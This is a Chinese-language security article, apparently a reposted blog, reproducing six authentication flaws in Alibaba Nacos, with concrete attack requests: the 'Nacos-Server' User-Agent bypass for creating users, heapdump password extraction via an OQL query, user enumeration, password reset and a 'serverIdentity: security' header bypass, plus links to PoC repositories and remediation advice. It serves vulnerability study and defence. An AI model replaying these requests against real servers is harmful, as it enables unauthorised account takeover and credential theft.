<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OWUNgUpz1YHSum78mmHtRA)

**基本介绍**  

Nacos 是一个用于动态服务发现、配置管理和服务治理的开源平台，由阿里巴巴公司贡献。Nacos 提供了基于 DNS 和 HTTP 的服务发现能力，支持多种注册中心和数据存储方式，包括自身内置的 Raft 协议和外部的 MySQL、Redis 等数据存储

**功能模块**

Nacos 主要包括以下几个模块：

*   注册中心：负责服务注册和发现，提供高可用、可扩展、动态化的服务注册与发现能力。  
    
*   配置中心：提供统一的配置管理平台，可以动态地对服务进行配置管理和发布，支持灰度发布和版本管理等功能。  
    
*   服务管理：提供服务健康状态检查、流量管理等功能，支持服务降级、容错处理等机制，保证了系统的高可用性和稳定性。
    
*   命名空间：提供了多租户的支持，可以在同一个集群中为不同的应用程序创建不同的命名空间来隔离彼此。  
    
*   权限管理：提供了基于角色的权限管理机制，可以实现精细化的权限控制，保证了服务的安全性和可控性。  
    

Nacos 可以广泛应用于微服务架构、云原生应用、DevOps 等场景，为企业级应用提供了一套完整的服务发现和治理方案。  

**追逐旅程  
**

**A、Alibaba Nacos 任意用户创建**

#### 影响范围

Nacos <= 2.0.0-ALPHA.1

#### 漏洞类型

权限认证绕过

#### 环境搭建

下载安装文件：

https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVK21AGjDIIxZfS6desLbJP2crh6KyWaVqm6RYIF4IUoLrGy3icJjCYNyw/640?wx_fmt=png)

之后执行以下命令启动环境：

```
./startup.sh -m standalone

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVK4CEdQMna29WNnVSdWaqvMqaTibFaMqyQiajibn2rIxrX1eRcia21FxDW5A/640?wx_fmt=png)

之后访问 http://your-ip:8848/nacos，默认账号密码为：nacos/nacos

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKxcSjsmS1sPkjmTNxxorM3uFiciaWdOC1uwmicPAtttJ2HZqQiaJjngoiazQ/640?wx_fmt=png)

#### 漏洞复现

Step 1: 查看用户列表

```
http://192.168.174.236:8848/nacos/v1/auth/users?pageNo=1&pageSize=1

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKzSo2iavIC4O0IywvclJspZXyD4xZR5KfCs40V8NIJIiclO2mCdSA7cJQ/640?wx_fmt=png)

Step 2：添加用户 Al1ex

```
http://your-ip:8848/nacos/v1/auth/users
POST:
Nacos-Server
.......
username=Al1ex&password=Al1ex

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKj2I7wDWQV9hmsDaEd7sSgeR7AAxaXPibRoGIgkasTNP3IkdulPlgZRA/640?wx_fmt=png)

Step 3: 登录测试

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKC3RYzjfM0G3UZAcfTfTGKibj6y9XLr3101ZOskS0DbUoc55HdbX4opw/640?wx_fmt=png)

成功登录：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKUwDDjgLPqaXgRK7seukibAc6IkRtOTDELpbL2lTPrDPrGQywaY8Fdkw/640?wx_fmt=png)

#### 漏洞分析

Nacos-Server 是用来进行服务间的通信的白名单，比如服务 A 要访问服务 B，如何知道服务 A 是服务，只需要在服务 A 访问服务 B 的时候 UA 上写成 Nacos-Server 即可，所以当我们 UA 恶意改为 Nacos-Server 的时候，就会被误以为是服务间的通信，因此在白名单当中从而绕过认证，下面我们来看一下关键的处理逻辑位置 TrafficReviseFilter.java 中的 doFilter 的设计，在这里可以看到当接收到其他节点服务的请求时应该被 pass：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVK9LGosRwekuFhGMozYMSgprQfKN6ZEIDm73l489giaLLXXuSpClXdicGQ/640?wx_fmt=png)

关键的判断逻辑如下：

```
        if (StringUtils.startsWith(agent, Constants.NACOS_SERVER_HEADER)) {
            filterChain.doFilter(req, resp);
            return;
        }

```

之后对 Constants.NACOS_SERVER_HEADER 进行跟踪，之后确定为 Nacos-Server：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVK0qicGiaMIMeVZUAHiclpiaR8SIJhqbNjcl0En5HUvowHbH3PO3lruRm3fg/640?wx_fmt=png)

#### 参考链接

https://github.com/alibaba/nacos/issues/4593

**B、Alibab Nacos 未授权登录后台**  

#### 影响范围

Nacos <= 2.1.0 version

#### 漏洞说明

Nacos 使用了默认的 JWT key 导致的未授权访问漏洞，通过该漏洞攻击者可以绕过用户名和密码验证直接登录到 nacos 用户后台

#### 漏洞复现

Step 1：直接访问 Nacos 网站，填写任意用户名密码并使用 Burpsuite 抓包

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKyvUzEhLRh5dyj6Q3zyzaIBxRWR95qqDnQT7avSpf14hyQyOGDwAbkg/640?wx_fmt=png)

Step 2：之后拦截回显数据包，回显数据包如下

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKmcwibS41wfj5DibdXRfOyM4kktdjW6skQYCJCpuvWDQNKsU4tu4SnFJQ/640?wx_fmt=png)

Step 3：修改回显数据包状态 403 为 200 并修改回显数据信息

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKsbkhDb0uAPribb5gKqqfCRremOGibA65x9gxo4ZwibgkyJdyFxZaIzAJg/640?wx_fmt=png)

Step 4：释放数据包后成功登录

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKeMcdmkne5gjLGHeFYVibIuCdNEGzSpn69w4FDM5zzlhLTLgr2Dcs3rw/640?wx_fmt=png)

**漏洞 POC**

https://github.com/Al1ex/Alibab-Nacos-Unauthorized-Login

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKLTwQCKfXBGicfXd1Xhdgr0WQ8INGxaJ35iaoONa3TofYvkmvdO3tiaGcQ/640?wx_fmt=png)

**C、Alibab Nacos 账号密码获取**

#### 影响范围

Alibab Nacos *

#### 漏洞概述

SpringBoot 框架下拥有一个 Actuator 用来提供对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等，在 Actuator 启用的情况下如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点 (endpoints) 来获取应用系统中的监控信息，其中 Spring Boot 1.x 版本默认在 Url 根目录下，Spring Boot 2.x 版本端点移动到 / actuator / 路径

Alibab Nacos 如果是在 sping boot 框架下搭建，那么将会继承 spring boot 本身带有的信息泄露漏洞，攻击者可以通过此漏洞获取 Alibab Nacos 账号密码

#### 漏洞复现

Step 1：Nacos 继承自 Spring Boot 的目录如下：

```
/nacos/actuator
/nacos/actuator/auditevents
/nacos/actuator/beans
/nacos/actuator/caches
/nacos/actuator/conditions
/nacos/actuator/configprops
/nacos/actuator/env
/nacos/actuator/health
/nacos/actuator/info
/nacos/actuator/httptrace
/nacos/actuator/mappings  
/nacos/actuator/metrics
/nacos/actuator/scheduledtasks
/nacos/actuator/loggers
/nacos/actuator/threaddump  
/nacos/actuator/prometheus
/nacos/actuator/heapdump

```

Step 2：访问 / env 接口确定漏洞是否存在

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKK4MEgfmjXZvcru7aseDsct3kGxKsOlwX6EacOg46YOjaCt8dicZpb4A/640?wx_fmt=png)

Step 3：调用 / heapdump 接口下载 heapdump 文件

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKeuvicqL4DGZobZRwP5wRpIa5o1sgQczUEfcRbZ5nufSmmybstyINuog/640?wx_fmt=png)

Step 4：使用 MemoryAnalyzer(https://www.eclipse.org/mat/downloads.php) 内存查看工具分析 headdump

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKPJpv531j8NWYI3gks6BCnnZlyCGn426kdXPVvSAkJHSI1qhRVvL7JA/640?wx_fmt=png)

Step 5：执行以下 OQL 语句获得密码

```
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVK6ticE6yPCRF1NGmdgWakibiclyw2VN9TjskuKIyMc9DU2qZmYYV9shqJw/640?wx_fmt=png)

Step 6：如果可以获取到用户名那边就可以直接登录

http://x.x.x.x/nacos/v1/auth/users?pageNo=1&pageSize=1

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKSJ9vsjBeVqq2duxzZ5mxPIDmBDBobK0jnAFL618ic4SCQibyrw4iaR1yg/640?wx_fmt=png)

**D、Alibaba Nacos 注册用户枚举**

#### 影响范围

Nacos < 2.2.0 

#### 漏洞类型

权限认证绕过

#### 利用条件

影响范围应用

#### 漏洞概述

Alibaba Nacos 注册用户枚举

#### 环境搭建

下载安装文件：

https://github.com/alibaba/nacos/releases

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKueC9ShApeBtdxTqF3oHpgunMZ2X6icL2jWdMqrhwBhZicczicCly82hew/640?wx_fmt=png)

之后执行以下命令启动环境：

```
./startup.sh -m standalone

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKrXHCxhaHVbPFsxhusOYbjQgGfGFjRXXl8Du5LY9103BfaeDibzm5icug/640?wx_fmt=png)

之后访问 http://your-ip:8848/nacos，默认账号密码为：nacos/nacos

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKhZQNNEjt4PGuBXJaUmwzS2LzicvKUcfrETibG59Dz0Aibk089sAAWwmxw/640?wx_fmt=png)

#### 漏洞复现

查看用户列表

```
http://192.168.174.236:8848/nacos/v1/auth/users?pageNo=1&pageSize=9

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKnGZ7u52NAP0Auv6NgagnViaPR5UNiaFGx4mzhiaEUTJtgD4XoIyCd8yGA/640?wx_fmt=png)

#### 安全建议

升级到 2.2.0 版本之后

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKkIRB30PgRIwkCLUhkaf0GCNU57zP8Pq9HticE4XHibPibtFjCRuHqicO9g/640?wx_fmt=png)

**E、Alibaba Nacos 任意用户密码重置**

#### 影响范围

Nacos <= 2.2.0

#### 漏洞类型

任意用户密码重置

#### 漏洞概述

Alibaba Nacos 任意用户密码重置

#### 环境搭建

下载安装文件：

https://github.com/alibaba/nacos

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKSoqib4Vrmjw9T4CY5TXQ9F7bsdVrLicHkR1OibnUCStljibibQicIeJlPKrQ/640?wx_fmt=png)

之后执行以下命令启动环境：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKShTicka5PgZgzx2k1pKA64pmKkP3HCNWynjoqqG1vICV1lVVRn4cLaQ/640?wx_fmt=png)

之后访问 http://your-ip:8848/nacos，默认账号密码为：nacos/nacos

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKsjSWDW2URMiaUckR2oMrHf9mE4nw5a3VLQB9vToWHEUibJ4OXctJbkqA/640?wx_fmt=png)

#### 漏洞复现

Step 1：获取用户名

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKXib5Mf6PgpGRAiaVRDZrwTHNIcdyaWfiaN6zz4JaW7sbtldraTFpB1O1w/640?wx_fmt=png)

Step 2：发送一下请求数据包重置密码

POC：https://github.com/Al1ex/Alibab-Nacos-Unauthorized-Reset-PWD

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKzCiaOWHkq9b6dcSMs7ia8QlBNMd1XYcTric9y8vreRSb9RgNDEmNbtWZw/640?wx_fmt=png)

Step 3：登录

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKG9kccibIeQYsibfp2x7SncBMqHjsylKPt6IF6IXf0Ue9HOic7JWEaPJcg/640?wx_fmt=png)

**F、Alibaba Nacos ServerIdentity 权限绕过**

#### 影响范围

Nacos <= 2.2.0

#### 漏洞概述

Nacos 能让您从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略。Nacos 平台在 Header 中添加 serverIdentity: security 能直接绕过身份验证查看用户列表

#### 漏洞复现

使用 POC 和 serverIdentity: security 查看当前用户名和密码

```
GET /nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken= HTTP/1.1
Host: \{\{Hostname\}\}
User-Agent: Mozilla/5.0 
Accept-Encoding: gzip, deflate 
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT
serverIdentity: security

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmXUKvjRpmTtibib64391jSVKsQytHicvHgWo7TUS4TEOkThuKngQx2MDutuN2vUeGsGNz31m9mITfJA/640?wx_fmt=png)

#### 安全建议

1、应用切换内网

2、更新到最新版本：https://github.com/alibaba/nacos/releases/tag/2.2.0.1

3、更改 application.properties 文件中 token.secret.key 默认值具体更改方法可参考：https://nacos.io/zh-cn/docs/v2/guide/user/auth.html